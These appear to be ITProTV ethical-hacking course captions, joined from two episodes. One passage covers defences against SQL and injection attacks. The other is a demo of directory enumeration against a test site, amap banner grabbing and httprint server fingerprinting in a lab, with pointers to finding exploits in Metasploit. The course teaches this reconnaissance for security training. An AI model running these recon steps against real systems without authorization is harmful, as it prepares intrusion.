and\n\n1132\n00:55:04.270 --> 00:55:05.840\ntalked about them as we've gone.\n\n1133\n00:55:05.840 --> 00:55:08.120\nYou know but\nthink about the encoding schemes we used.\n\n1134\n00:55:08.120 --> 00:55:12.190\nWe talked about unicode manipulation right\nchanging and trying to push attacks.\n\n1135\n00:55:12.190 --> 00:55:15.560\nAsking unicode, base 64, hex in coding.\n\n1136\n00:55:15.560 --> 00:55:19.620\nYou know these are all different ways in\nwhich we may be able to secure data and\n\n1137\n00:55:19.620 --> 00:55:22.230\nwe have to think through and\nobviously understand that.\n\n1138\n00:55:22.230 --> 00:55:24.520\nSo you know encoding may be one approach.\n\n1139\n00:55:24.520 --> 00:55:27.670\nObviously when we're defending\nagainst SQL attacks, we have, and\n\n1140\n00:55:27.670 --> 00:55:29.520\nwe've talked a lot about\nthe things we should do.\n\n1141\n00:55:29.520 --> 00:55:32.560\nLimit length of user input,\ncreate custom error messages so\n\n1142\n00:55:32.560 --> 00:55:35.130\nwe're not giving out generic\nones that give out information,\n\n1143\n00:55:35.130 --> 00:55:39.310\nmonitor database traffic using web\napplication firewalls, things like that.\n\n1144\n00:55:39.310 --> 00:55:44.040\nDisable commands that would potentially be\nproblematic like opening up command shells\n\n1145\n00:55:44.040 --> 00:55:48.140\nfrom within the SQL Query Code itself,\nisolate the database server and\n\n1146\n00:55:48.140 --> 00:55:49.890\nthe web server from other systems.\n\n1147\n00:55:49.890 --> 00:55:54.890\nSo we can't really see propagation attacks\nthat go backwards into other areas.\n\n1148\n00:55:54.890 --> 00:55:58.610\nSo, things like that run the database\nservice account with minimal rights.\n\n1149\n00:55:58.610 --> 00:56:01.300\nSo even if we hack it,\npotentially through a buffer overflow,\n\n1150\n00:56:01.300 --> 00:56:04.260\nwe don't necessarily get full\nadmin rights to the box.\n\n1151\n00:56:04.260 --> 00:56:06.690\nMove extended store procedures\nout to an isolated server,\n\n1152\n00:56:06.690 --> 00:56:08.080\nrun them separately, right.\n\n1153\n00:56:08.080 --> 00:56:11.100\nThat's a big one cuz if we run\nthose extended server procedures.\n\n1154\n00:56:11.100 --> 00:56:12.880\nWe may be able to overflow the buffer and\n\n1155\n00:56:12.880 --> 00:56:16.200\ncreate a Denial of Service event because\nwe'll tee them up and run them five, six,\n\n1156\n00:56:16.200 --> 00:56:18.740\nseven, eight, ten times in a row and\ncrash the server.\n\n1157\n00:56:18.740 --> 00:56:21.920\nSo that should run separately with\nan OBDC connection back, right?\n\n1158\n00:56:21.920 --> 00:56:24.240\nAnd so\nwe just pull the data over the wire,\n\n1159\n00:56:24.240 --> 00:56:28.460\nobviously encrypt that\nwhen you're doing that.\n\n1160\n00:56:28.460 --> 00:56:31.920\nValidate incentive dates [LAUGH]\n&gt;&gt; Validated sanitized\n\n1161\n00:56:31.920 --> 00:56:34.240\ninputs that are being passed back and\nforth.\n\n1162\n00:56:34.240 --> 00:56:35.900\nWanna make sure we're doing that.\n\n1163\n00:56:35.900 --> 00:56:36.930\nSo think about that.\n\n1164\n00:56:38.060 --> 00:56:40.490\nMaking sure we have low privilege\naccounts in general for\n\n1165\n00:56:40.490 --> 00:56:41.740\ndatabase connections, right.\n\n1166\n00:56:41.740 --> 00:56:45.320\nSo any of the accounts that are being used\nshould really just have minimal set of\n\n1167\n00:56:45.320 --> 00:56:49.260\nrights, cuz if they don't,\nthen obviously that can be a big issue.\n\n1168\n00:56:49.260 --> 00:56:52.720\nIn general, how we defend against\nall these kind of injection attacks?\n\n1169\n00:56:52.720 --> 00:56:56.260\nSQL attacks, command injection,\nLDAP is really the same kind of thing.\n\n1170\n00:56:56.260 --> 00:56:59.250\nDon't allow dangerous characters\nto be used in the stream.\n\n1171\n00:56:59.250 --> 00:57:01.050\nDo input validation.\n\n1172\n00:57:01.050 --> 00:57:03.310\nLanguage specific library\nshould be addressed.\n\n1173\n00:57:03.310 --> 00:57:07.310\nWe talked about the C Libraries and the\nsecure, insecure thought process there.\n\n1174\n00:57:07.310 --> 00:57:11.170\nSafe APIs should be\nused whenever possible.\n\n1175\n00:57:11.170 --> 00:57:14.960\nParameterized SQL queries should be used\ninstead of unstructured SQL queries.\n\n1176\n00:57:14.960 --> 00:57:17.710\nWhich may or may not prove to be an issue.\n\n1177\n00:57:17.710 --> 00:57:20.100\nSo make sure we're focusing\non those kind of things.\n\n1178\n00:57:20.100 --> 00:57:23.520\nCuz again, these are the areas where we're\ngonna wind up having problems, right.\n\n1179\n00:57:23.520 --> 00:57:27.310\nAnd if we're not careful We're\ngonna have some significant issues.\n\n1180\n00:57:27.310 --> 00:57:32.420\nAll right, I think that's probably\na pretty thorough conversation about web\n\n1181\n00:57:32.420 --> 00:57:35.880\nattacks from the application side\nas opposed to the server side.\n\n1182\n00:57:35.880 --> 00:57:37.000\n&gt;&gt; All right, very good.\n\n1183\n00:57:37.000 --> 00:57:39.430\nYeah, really good look,\nreally thorough look, and we compared and\n\n1184\n00:57:39.430 --> 00:57:43.840\ncontrasted attacking the web server\nversus Hacking the web applications.\n\n1185\n00:57:43.840 --> 00:57:46.220\nWe talked about a lot of\ndifferent types of attacks,\n\n1186\n00:57:46.220 --> 00:57:51.100\nthat can be propagated against\nthese web applications.\n\n1187\n00:57:51.100 --> 00:57:52.880\nWe took a look at the methodology.\n\n1188\n00:57:52.880 --> 00:57:54.010\nAnd how to proceed and\n\n1189\n00:57:54.010 --> 00:57:57.480\nhow we go through the method for\nattacking these web applications.\n\n1190\n00:57:57.480 --> 00:57:59.320\nAnd then some kind of measures as well.\n\n1191\n00:57:59.320 --> 00:58:01.280\nSo I appreciate that, Adam.\n\n1192\n00:58:01.280 --> 00:58:03.820\nI hope everybody out there\nenjoyed watching Signing off for\n\n1193\n00:58:03.820 --> 00:58:06.460\nITProTV I'm Mike Roderick.\n\n1194\n00:58:06.460 --> 00:58:08.145\n&gt;&gt; I'm a

00:58:11.284\n&gt;&gt; If we don't overflow.\n\n1198\n00:58:11.284 --> 00:58:12.445\nMy head gets too big.\n\n1199\n00:58:12.445 --> 00:58:13.206\n[LAUGH]\n\n1200\n00:58:13.206 -->

00:00:16.698\nI’m your host Mike Rodrick, and\n\n4\n00:00:16.698 --> 00:00:19.651\ntoday we're doing our\nCertified Ethical Hacker Version 9.\n\n5\n00:00:19.651 --> 00:00:21.529\nAnd specifically, in this episode,\n\n6\n00:00:21.529 --> 00:00:25.178\nwe’re actually continuing our\nconversation on with web applications.\n\n7\n00:00:25.178 --> 00:00:27.127\nWe did our lecture.\n\n8\n00:00:27.127 --> 00:00:28.312\nWe talked about it.\n\n9\n00:00:28.312 --> 00:00:31.200\nNow, it's time for some hands-on.\n\n10\n00:00:31.200 --> 00:00:34.050\nAnd here to guide us through\nthat is Mister Adam Gordon.\n\n11\n00:00:34.050 --> 00:00:35.369\nHow you doing, Adam?\n&gt;&gt; I'm good.\n\n12\n00:00:35.369 --> 00:00:36.007\nI'm good.\n\n13\n00:00:36.007 --> 00:00:38.027\nLet me pull my arm back in so\nit's part of the shot.\n\n14\n00:00:38.027 --> 00:00:42.427\nHere I am extending my arm off to\nthe side trying to relax there.\n\n15\n00:00:42.427 --> 00:00:43.530\nSo I'm good.\n\n16\n00:00:43.530 --> 00:00:46.700\nAs Mike said were gonna do\na little show and tell.\n\n17\n00:00:46.700 --> 00:00:49.830\nOne of my more favorite\nportions of our time together.\n\n18\n00:00:49.830 --> 00:00:54.310\nWe get to go in and actually demonstrate\nfor you some of the technology,\n\n19\n00:00:54.310 --> 00:00:59.262\nthe techniques, the things that\nwe have been talking about.\n\n20\n00:00:59.262 --> 00:01:03.340\nWe're gonna take a look at how\nto do some directory traversal.\n\n21\n00:01:03.340 --> 00:01:05.110\nWe’ll take a look at that.\n\n22\n00:01:05.110 --> 00:01:09.150\nWe're going to take a look at how to\ngo in and do a little banner grabbing.\n\n23\n00:01:09.150 --> 00:01:14.080\nSo we’ll take a look at that, and maybe\na couple other surprises along the way.\n\n24\n00:01:14.080 --> 00:01:16.678\nMike said he may be tempted,\nif we can motivate him,\n\n25\n00:01:16.678 --> 00:01:18.697\nto do a little soft-shoe for us, here.\n\n26\n00:01:18.697 --> 00:01:20.370\nSo he may do a little tap for us, later.\n\n27\n00:01:20.370 --> 00:01:22.135\n&gt;&gt; [LAUGH]\n&gt;&gt; We'll see how that goes.\n\n28\n00:01:22.135 --> 00:01:24.073\nPretty impressive if you\nnever seen him do that.\n\n29\n00:01:24.073 --> 00:01:25.594\nHe does that in the break room sometimes.\n\n30\n00:01:25.594 --> 00:01:27.907\nEverybody just stops what they're doing.\n\n31\n00:01:27.907 --> 00:01:29.394\nIt's like a big party.\n\n32\n00:01:29.394 --> 00:01:31.460\nVery, very cool, so we'll see.\n\n33\n00:01:31.460 --> 00:01:34.258\nAnd if not, he may just go wander off and\nhunt Pokemon, so we'll see how that goes.\n\n34\n00:01:34.258 --> 00:01:37.021\n&gt;&gt; I'll think about doing that if\nyou promise to show us your finger\n\n35\n00:01:37.021 --> 00:01:37.846\ndancing routine.\n\n36\n00:01:37.846 --> 00:01:39.600\n&gt;&gt; My finger dancing routine.\n\n37\n00:01:39.600 --> 00:01:40.770\n&gt;&gt; Yeah.\n\n38\n00:01:40.770 --> 00:01:41.310\nNo problem.\n\n39\n00:01:41.310 --> 00:01:41.980\nAre you ready?\n&gt;&gt; Dang it.\n\n40\n00:01:41.980 --> 00:01:44.746\n[LAUGH]\n&gt;&gt; You got music?\n\n41\n00:01:44.746 --> 00:01:46.084\n&gt;&gt; [LAUGH]\n&gt;&gt; Let's get going.\n\n42\n00:01:46.084 --> 00:01:46.769\n&gt;&gt; [MUSIC]\n\n43\n00:01:46.769 --> 00:01:47.628\n&gt;&gt; I can do a mean can-can.\n\n44\n00:01:47.628 --> 00:01:51.691\n&gt;&gt; [MUSIC]\n\n45\n00:01:51.691 --> 00:01:52.306\n&gt;&gt; Watch this.\n\n46\n00:01:52.306 --> 00:01:53.571\nSplit, [SOUND], okay.\n\n47\n00:01:53.571 --> 00:01:56.253\n&gt;&gt; [LAUGH]\n&gt;&gt; I can do roller finger dancing as well.\n\n48\n00:01:56.253 --> 00:01:58.414\nI get a little pair of finger skates,\n\n49\n00:01:58.414 --> 00:02:00.640\nthen I can-\n&gt;&gt; Do a little roll?\n\n50\n00:02:00.640 --> 00:02:01.330\n&gt;&gt; Absolutely.\n\n51\n00:02:01.330 --> 00:02:05.295\nI am multi-talented and\nversatile, as they say.\n\n52\n00:02:05.295 --> 00:02:08.135\n&gt;&gt; [LAUGH]\n&gt;&gt; All right, you can't scare me, sir,\n\n53\n00:02:08.135 --> 00:02:09.900\nwith finger dancing challenges.\n\n54\n00:02:09.900 --> 00:02:11.680\nI refuse to be intimidated.\n\n55\n00:02:11.680 --> 00:02:13.500\nAll right, so let's go.\n\n56\n00:02:13.500 --> 00:02:16.251\nLet's take a look at our screen, here.\n\n57\n00:02:16.251 --> 00:02:22.904\nLet's actually take a look\nat how we can use a website.\n\n58\n00:02:22.904 --> 00:02:24.620\nWe've got an interesting\nlittle website here.\n\n59\n00:02:24.620 --> 00:02:27.060\nMike will give you the URL for\nthis, later.\n\n60\n00:02:27.060 --> 00:02:31.010\nThis is not an easy one\ncuz it's rather long.\n\n61\n00:02:31.010 --> 00:02:33.715\nSo what we're gonna do is just\nalready have it loaded up for you.\n\n62\n00:02:33.715 --> 00:02:35.922\nIt's a Pentest Tools website.\n\n63\n00:02:35.922 --> 00:02:40.739\nWhat we can do there is they have\na little URL Fuzzer tool that they have\n\n64\n00:02:40.739 --> 00:02:42.330\nloaded up on the site.\n\n65\n00:02:42.330 --> 00:02:49.365\nWe can go in here, and we're just gonna\ntype in a URL that we want to test.\n\n66\n00:02:49.365 --> 00:02:57.251\nSo we'll do our testphp.vulnweb.com.\n\n67\n00:02:57.251 --> 00:03:01.769\nWhat we're gonna do is when we go in here,\nyeah, right.\n\n68\n00:03:01.769 --> 00:03:04.890\nAnd then, obviously, I can give you\nthe full URL out to that, so no problem.\n\n69\n00:03:04.890 --> 00:03:07.000\nWhat we're gonna do is\nwe have an option here.\n\n70\n00:03:07.000 --> 00:03:09.630\nTry to search for directories or\nsearch for files.\n\n71\n00:03:09.630 --> 00:03:10.405\nI'm gonna search for\n\n72\n00:03:10.405 --> 00:03:12.783\ndirectories because we want to\ndo a little directory traversal.\n\n73\n00:03:12.783 --> 00:03:17.388\nWe wanna walk through here trying to\nfigure out potentially what may be there,\n\n74\n00:03:17.388 --> 00:03:18.938\nthe hidden directories.\n\n75\n00:03:18.938 --> 00:03:24.836\nMaybe we've done a robot.txt attack,\ngot the robot file from the website.\n\n76\n00:03:24.836 --> 00:03:27.596\nWanna validate and go look for\nsome of those URLs now, or\n\n77\n00:03:27.596 --> 00:03:29.440\nthose directories, rather.\n\n78\n00:03:29.440 --> 00:03:30.022\nSo we're gonna do that.\n\n79\n00:03:30.022 --> 00:03:33.572\nWe're gonna hit start here, and\nit prompts us, comes up a little,\n\n80\n00:03:33.572 --> 00:03:35.084\nhey, are you a human being?\n\n81\n00:03:35.084 --> 00:03:37.396\nYou gonna know a little bit about math,\nhere,\n\n82\n00:03:37.396 --> 00:03:39.426\nbecause comes up with a math challenge.\n\n83\n00:03:39.426 --> 00:03:45.091\nIt has 77 + 0, and you have to say what\nthat is, and it's got a little X there.\n\n84\n00:03:45.091 --> 00:03:47.077\nIs that 77 or 7?\n\n85\n00:03:47.077 --> 00:03:47.947\nI can't even see.\n\n86\n00:03:47.947 --> 00:03:49.590\nI think that's 77.\n\n87\n00:03:49.590 --> 00:03:52.180\nSo let's see,\nwe'll get that started there.\n\n88\n00:03:53.620 --> 00:03:54.414\n&gt;&gt; Are you human?\n\n89\n00:03:54.414 --> 00:03:55.527\n&gt;&gt; Am I human?\n\n90\n00:03:55.527 --> 00:03:58.684\nAll right, so it's going through, and\nit's just gonna run through quickly.\n\n91\n00:03:58.684 --> 00:04:02.969\nIt's gonna go and it gives you\na percentage counter, 50% done, 60% done.\n\n92\n00:04:02.969 --> 00:04:04.931\nLet's wait until it hits the bottom,\nthere.\n\n93\n00:04:04.931 --> 00:04:08.251\nOnce it does, it gives us a little\nreport down at the bottom.\n\n94\n00:04:08.251 --> 00:04:12.637\nFinds four, in this case, directories,\nthat potentially are hidden,\n\n95\n00:04:12.637 --> 00:04:14.750\nthat we may want walk through.\n\n96\n00:04:14.750 --> 00:04:16.700\nGives them a list of\nthem with links to each.\n\n97\n00:04:16.700 --> 00:04:17.720\nI have Admin.\n\n98\n00:04:17.720 --> 00:04:18.550\nI have Pictures.\n\n99\n00:04:18.550 --> 00:04:20.400\nI have Images, etc.\n\n100\n00:04:20.400 --> 00:04:24.020\nAdmin sounds like it may have\nsomething of interest for us.\n\n101\n00:04:24.020 --> 00:04:26.850\nSo we're gonna go ahead, and\nwe're gonna take a look at that.\n\n102\n00:04:26.850 --> 00:04:28.630\nWe'll just click through there and,\nsure enough,\n\n103\n00:04:28.630 --> 00:04:32.230\nwe're able to produce the list\nof the files in the directory.\n\n104\n00:04:32.230 --> 00:04:34.210\nAnd you can see there, we have the root.\n\n105\n00:04:34.210 --> 00:04:36.100\nAnd then we have a create.sql.\n\n106\n00:04:36.100 --> 00:04:39.550\nSo it shows us that there's one one or\nmore files that may available.\n\n107\n00:04:39.550 --> 00:04:42.630\nAnd by doing this, we're able to\nexecute a directory traversal attack.\n\n108\n00:04:42.630 --> 00:04:45.261\nThis is just an automated\ntools that does that for us.\n\n109\n00:04:45.261 --> 00:04:49.026\nWe've been talking a lot about directory\ntraversal attacks in some of our\n\n110\n00:04:49.026 --> 00:04:49.824\ndiscussions.\n\n111\n00:04:49.824 --> 00:04:52.880\nSaying, hey, you know, you would go in,\nyou would do it this way.\n\n112\n00:04:52.880 --> 00:04:55.720\nBut we haven't actually\nreally shown you one.\n\n113\n00:04:55.720 --> 00:04:58.156\nAnd so I though it would be nice if we\njust showed you how we actually can\n\n114\n00:04:58.156 --> 00:04:58.662\nexecute one.\n\n115\n00:04:58.662 --> 00:05:01.101\nSo there you go.\n\n116\n00:05:01.101 --> 00:05:02.297\nNow we've executed one.\n\n117\n00:05:02.297 --> 00:05:05.321\n&gt;&gt; So no more complaining\nabout the fact you don't know\n\n118\n00:05:05.321 --> 00:05:08.009\nwhat directory traversal\nattacks look like.\n\n119\n00:05:08.009 --> 00:05:12.234\n&gt;&gt; [LAUGH]\n&gt;&gt; We're gonna move up into our Kali Linux\n\n120\n00:05:12.234 --> 00:05:13.373\nworld here.\n\n121\n00:05:13.373 --> 00:05:15.173\nJust another VM we have running.\n\n122\n00:05:15.173 --> 00:05:17.634\nI've already gone to the trouble\nof setting up the puTTy session.\n\n123\n00:05:17.634 --> 00:05:21.628\nWe've logged into Kali,\njust on the background work here.\n\n124\n00:05:21.628 --> 00:05:25.239\nI wanna show you a tool called Amap,\nwhich runs on Kali.\n\n125\n00:05:25.239 --> 00:05:28.687\nAmap is gonna allow us\nto do banner grabbing.\n\n126\n00:05:28.687 --> 00:05:31.955\nThis is just one the Linux\ntools that can be used, and\n\n127\n00:05:31.955 --> 00:05:34.863\nit helps us to gain basic\nserver information.\n\n128\n00:05:34.863 --> 00:05:40.483\nWhat we're gonna do is load Amap,\nso, amap, and then, -B.\n\n129\n00:05:40.483 --> 00:05:42.750\nAgain, the whole case-sensitivity thing.\n\n130\n00:05:42.750 --> 00:05:44.500\nB for banner by the way.\n\n131\n00:05:44.500 --> 00:05:47.875\nOr B for boy, or B for a baklava,\ndepends on what you're in the mood for.\n\n132\n00:05:47.875 --> 00:05:49.220\n[LAUGH] You know, for lunch.\n\n133\n00:05:49.220 --> 00:05:51.230\nYou never know.\nYou may just feel like a piece of baklava.\n\n134\n00:05:51.230 --> 00:05:53.750\nSo if that's the case,\nthen you know, you do capital B.\n\n135\n00:05:53.750 --> 00:05:55.068\nAnd you get a piece of baklava.\n\n136\n00:05:55.068 --> 00:06:00.780\nSo 192.168.01, and\nthen we're gonna specify a port number.\n\n137\n00:06:00.780 --> 00:06:03.510\nIn this case, 21 for FTP.\n\n138\n00:06:03.510 --> 00:06:07.760\nThose of you that have not looked at our\nport list that Mike put together for you.\n\n139\n00:06:07.760 --> 00:06:10.730\nWanna make sure you take a look at\nthat because we did put together\n\n140\n00:06:10.730 --> 00:06:12.500\na pretty extensive port list.\n\n141\n00:06:12.500 --> 00:06:13.860\n&gt;&gt; We did.\n&gt;&gt; With a bunch of stuff.\n\n142\n00:06:13.860 --> 00:06:16.985\nAnd we wanna just make sure you have an\nopportunity to use that to drive a little\n\n143\n00:06:16.985 --> 00:06:18.070\nreview and studying.\n\n144\n00:06:18.070 --> 00:06:19.700\nAlways good to know your ports.\n\n145\n00:06:19.700 --> 00:06:21.460\nSo port 21 is FTP.\n\n146\n00:06:21.460 --> 00:06:24.814\nWe're gonna go out and\nprobe this IP address,\n\n147\n00:06:24.814 --> 00:06:28.342\nwhich is a machine that's\nrunning a web server.\n\n148\n00:06:28.342 --> 00:06:29.932\nAnd then we're gonna see what we get.\n\n149\n00:06:29.932 --> 00:06:31.012\nWe're gonna hit Enter.\n\n150\n00:06:31.012 --> 00:06:37.316\nGoes out, grabs it, and comes back and\nsays, hey, 220 Microsoft FTP service.\n\n151\n00:06:37.316 --> 00:06:42.192\nWhich means that this machine is running\na Microsoft IIS server with FTP on it.\n\n152\n00:06:42.192 --> 00:06:46.944\nSo this would allow me to do a little\nfingerprinting, a little recon,\n\n153\n00:06:46.944 --> 00:06:48.160\nkinda all in one.\n\n154\n00:06:48.160 --> 00:06:49.440\nNow, I did cheat a little bit.\n\n155\n00:06:49.440 --> 00:06:52.130\nI do have to admit that\nbecause I'm an honest person.\n\n156\n00:06:52.130 --> 00:06:54.490\nI would never tell a lie or\nchop down a cherry tree.\n\n157\n00:06:54.490 --> 00:06:56.510\nI don't wear wooden dentures, however.\n\n158\n00:06:56.510 --> 00:06:57.830\nI do have all my own teeth.\n\n159\n00:06:57.830 --> 00:07:02.799\nBut I did set up ahead of time, to do\nthe demo for you, a FTP service running on\n\n160\n00:07:02.799 --> 00:07:07.951\na Microsoft machine with a web server\nrunning in our little demo environment.\n\n161\n00:07:07.951 --> 00:07:10.982\nObviously, knowing that,\nI know what the outcome will be.\n\n162\n00:07:10.982 --> 00:07:12.274\nBut in the real world,\n\n163\n00:07:12.274 --> 00:07:16.496\nyou would target Amap against a machine\nyou suspect of being a web server.\n\n164\n00:07:16.496 --> 00:07:17.913\nYou don't know for sure, obviously.\n\n165\n00:07:17.913 --> 00:07:19.015\nYou're gotta go check it out.\n\n166\n00:07:19.015 --> 00:07:22.835\nWhat it does is go out and\nissues a get request.\n\n167\n00:07:22.835 --> 00:07:25.424\nEssentially, hey,\ntell me what's going on over there.\n\n168\n00:07:25.424 --> 00:07:27.828\nAnd we get back the banner\nfrom that machine.\n\n169\n00:07:27.828 --> 00:07:33.737\nAnd it tells us, in theory,\nwhat the web server and the OS are.\n\n170\n00:07:33.737 --> 00:07:38.190\nSo we can identify whether it's Microsoft\nand/or whether it is Linux-based.\n\n171\n00:07:38.190 --> 00:07:40.362\nNow, this is a very small\npiece of a bigger puzzle.\n\n172\n00:07:40.362 --> 00:07:43.527\nWe wanna keep in mind that\nwhen we are doing this,\n\n173\n00:07:43.527 --> 00:07:48.406\nthis in and of itself is a very tiny\npiece of information, but very useful.\n\n174\n00:07:48.406 --> 00:07:52.531\nEarly on in our attack cycles, to map\nout and to do the reconnaissance around\n\n175\n00:07:52.531 --> 00:07:56.205\nthe network to figure out what kind\nof Techniques we may have to bring\n\n176\n00:07:56.205 --> 00:07:59.567\nthe bear later in order to\nsuccessfully attack this machine.\n\n177\n00:07:59.567 --> 00:08:04.563\nBut just identifying it as being\na Windows-based machine would then\n\n178\n00:08:04.563 --> 00:08:05.861\nallow us to go in.\n\n179\n00:08:05.861 --> 00:08:10.815\nYou and I were talking about Google\nhacking a day or two ago, Johnny.ihack.\n\n180\n00:08:10.815 --> 00:08:14.840\nAnd the fact that the Google database,\nthe hacking database is still out there.\n\n181\n00:08:14.840 --> 00:08:19.195\nWhat we could do is take this information,\ngo to the Google Hacking Database for\n\n182\n00:08:19.195 --> 00:08:20.763\ninstance, is one example.\n\n183\n00:08:20.763 --> 00:08:27.830\nAnd we could then look up exploits\non Microsoft IIS, whatever version.\n\n184\n00:08:27.830 --> 00:08:30.730\nAnd then we would get probably 10,\n20, 30, I don't know how many.\n\n185\n00:08:30.730 --> 00:08:34.100\nIt depends on the version of the web\nserver that we're looking at.\n\n186\n00:08:34.100 --> 00:08:38.660\nWe would get multiple versions of pre-made\nattack code, or pre-made exploits, or\n\n187\n00:08:38.660 --> 00:08:39.800\nwhatever the case maybe.\n\n188\n00:08:39.800 --> 00:08:42.210\nWe may go to Metasploit, and\nload the Metasploit framework.\n\n189\n00:08:42.210 --> 00:08:44.380\nWe've used that quite a bit,\nand shown you that.\n\n190\n00:08:44.380 --> 00:08:48.107\nWe've actually even take you out\nto the Metasploit website in one\n\n191\n00:08:48.107 --> 00:08:49.607\nof our last discussions.\n\n192\n00:08:49.607 --> 00:08:53.308\nAnd talked about the value of\nthe framework and how you could use that,\n\n193\n00:08:53.308 --> 00:08:54.573\nboth for good and evil.\n\n194\n00:08:54.573 --> 00:08:56.982\nHave I ever shown you\nmy evil finger dancing?\n\n195\n00:08:56.982 --> 00:08:58.640\nI don't think I've never\nshown you that one.\n\n196\n00:08:58.640 --> 00:09:00.030\nThat's not good for the camera though.\n\n197\n00:09:00.030 --> 00:09:03.560\nThat would not be appropriate, but\nit's a pretty cool thing to watch.\n\n198\n00:09:03.560 --> 00:09:04.620\n&gt;&gt; We'll have to check that out.\n\n199\n00:09:04.620 --> 00:09:07.176\n&gt;&gt; Yeah, like offline,\nwhen we're not being broadcast.\n\n200\n00:09:07.176 --> 00:09:08.514\n&gt;&gt; [LAUGH]\n&gt;&gt; We'll have to ask Meghan to step\n\n201\n00:09:08.514 --> 00:09:11.315\noutside, though, cuz it's not\nappropriate for her to see that, either.\n\n202\n00:09:11.315 --> 00:09:12.500\n&gt;&gt; [LAUGH]\n&gt;&gt; I don't want her to think ill of me\n\n203\n00:09:12.500 --> 00:09:13.019\nafter the fact.\n\n204\n00:09:13.019 --> 00:09:15.630\nWe can, certainly, go in.\n\n205\n00:09:15.630 --> 00:09:17.826\nWe could then take this knowledge\nthat we've been gaining.\n\n206\n00:09:17.826 --> 00:09:20.824\nAnd we can manipulate that,\nuse that to our advantage.\n\n207\n00:09:20.824 --> 00:09:25.396\nAnd then fill in the next several steps on\nthe, hey, what's my checklist look like to\n\n208\n00:09:25.396 --> 00:09:29.477\nhack the web server piece of paper that\nwe are tracking this information on?\n\n209\n00:09:29.477 --> 00:09:30.708\nJust wanna think about that.\n\n210\n00:09:30.708 --> 00:09:31.700\nLet's move along.\n\n211\n00:09:31.700 --> 00:09:33.920\nLet's get back in to where we were.\n\n212\n00:09:33.920 --> 00:09:36.680\nLet's go ahead and let's take\na look at web server footprinting.\n\n213\n00:09:36.680 --> 00:09:40.880\nWe were just talking about\npotentially being able to go in, and\n\n214\n00:09:40.880 --> 00:09:43.560\nbeing able to take this information.\n\n215\n00:09:43.560 --> 00:09:44.732\nTake to the next level.\n\n216\n00:09:44.732 --> 00:09:48.645\nFootprinting is a way we're gonna do that,\nat least to validate for sure.\n\n217\n00:09:48.645 --> 00:09:51.550\nCuz what I know, right now,\nis I know were running Microsoft FTP.\n\n218\n00:09:51.550 --> 00:09:54.380\nWhat I don't know is the version of IIS,\nand the version of the web.\n\n219\n00:09:54.380 --> 00:09:56.900\nNow what we're wanna do\nis kinda figure that out.\n\n220\n00:09:56.900 --> 00:10:00.180\nSo the next step, we're gonna come\nback down to Windows, here, and\n\n221\n00:10:00.180 --> 00:10:01.280\nwe're gonna load a tool up.\n\n222\n00:10:01.280 --> 00:10:02.900\nLet me just click here.\n\n223\n00:10:02.900 --> 00:10:08.020\nGonna load a tool up called httprint.\n\n224\n00:10:08.020 --> 00:10:12.933\nWe talked about this in our discussion\nin the hacking web applications area.\n\n225\n00:10:12.933 --> 00:10:15.370\nThis is a tool you could find\non the web and download.\n\n226\n00:10:15.370 --> 00:10:17.225\nAll I did was,\nit comes down as a ZIP file.\n\n227\n00:10:17.225 --> 00:10:18.760\nI just extracted the ZIP.\n\n228\n00:10:18.760 --> 00:10:21.370\nI run the program, loaded it up.\n\n229\n00:10:21.370 --> 00:10:24.510\nWhat I did is I put in a URL.\n\n230\n00:10:24.510 --> 00:10:25.720\nExcuse me, I keep saying URL.\n\n231\n00:10:25.720 --> 00:10:27.050\nIt's like a web on the brain.\n\n232\n00:10:27.050 --> 00:10:30.770\nI put in an IP address in\nthe area here where it says host.\n\n233\n00:10:30.770 --> 00:10:33.050\nI put in a port that I wanna specify.\n\n234\n00:10:33.050 --> 00:10:36.450\nAnd then I executed the tool,\nthis little Go button down here.\n\n235\n00:10:36.450 --> 00:10:39.380\nWhen I did that, I know it's hard to see,\nI'm gonna bring up a report for\n\n236\n00:10:39.380 --> 00:10:40.230\nyou in a minute.\n\n237\n00:10:40.230 --> 00:10:45.334\nIt comes back and says, hey,\nyou're running Microsoft IIS version 7.5.\n\n238\n00:10:45.334 --> 00:10:50.910\nAnd you're most likely running a Windows\nbox with this particular flavor.\n\n239\n00:10:50.910 --> 00:10:52.803\nAnd then we could save the output,\nso I saved it.\n\n240\n00:10:52.803 --> 00:10:57.612\nAnd then all we have to do is just\ngo in and actually pull that up.\n\n241\n00:10:57.612 --> 00:11:00.253\nThere's a little web report that opens up.\n\n242\n00:11:00.253 --> 00:11:03.540\nWe'll just open that in a little\nseparate window there, bring that up.\n\n243\n00:11:03.540 --> 00:11:07.140\nSo this is the output of the web\nserver fingerprinting report.\n\n244\n00:11:08.500 --> 00:11:11.730\nLet me just click there,\nget that back in there.\n\n245\n00:11:11.730 --> 00:11:15.490\nAnd then what I'm gonna do,\ncuz I know it's kinda hard to see.\n\n246\n00:11:15.490 --> 00:11:20.970\nIs just zoom that a little bit,\nmake that a little better for you.\n\n247\n00:11:20.970 --> 00:11:22.200\n&gt;&gt; Thank you.\n\n248\n00:11:22.200 --> 00:11:25.810\n&gt;&gt; I'll do that one more time,\nmake it like 200% just so we can see it.\n\n249\n00:11:25.810 --> 00:11:27.790\nCuz I know it is kinda, there we go.\n\n250\n00:11:27.790 --> 00:11:29.329\nIt's probably a little bit easier to see.\n\n251\n00:11:29.329 --> 00:11:31.537\nSo now you can see the host is there.\n\n252\n00:11:31.537 --> 00:11:32.572\nWe could see the port.\n\n253\n00:11:32.572 --> 00:11:36.191\nWe see banner report is Microsoft IIS 7.5.\n\n254\n00:11:36.191 --> 00:11:41.070\nIt says that it's deducing,\nthat it'd may be IIS version 6.\n\n255\n00:11:41.070 --> 00:11:42.730\nIt is clearly Windows.\n\n256\n00:11:42.730 --> 00:11:44.825\nNot quite sure exactly what version.\n\n257\n00:11:44.825 --> 00:11:45.562\nWe're between the two.\n\n258\n00:11:45.562 --> 00:11:50.630\nIt's reporting 7.5, which means it\nwould be a 2008 box, most likely.\n\n259\n00:11:50.630 --> 00:11:52.164\nProbably 8 R2.\n\n260\n00:11:52.164 --> 00:11:54.653\nBut we're gonna start guessing.\n\n261\n00:11:54.653 --> 00:11:56.967\nSo now what we're gonna do is\ntake this piece of information.\n\n262\n00:11:56.967 --> 00:12:00.955\nAnd leverage this and use this to\nbe able to go out and to look for\n\n263\n00:12:00.955 --> 00:12:03.586\nsome of those exploits, potentially.\n\n264\n00:12:03.586 --> 00:12:06.618\nThis is how we would do the fingerprinting\nthat would kind of take us to\n\n265\n00:12:06.618 --> 00:12:07.310\nthe next step.\n\n266\n00:12:07.310 --> 00:12:10.321\nAnd would hopefully help us\nto understand what's 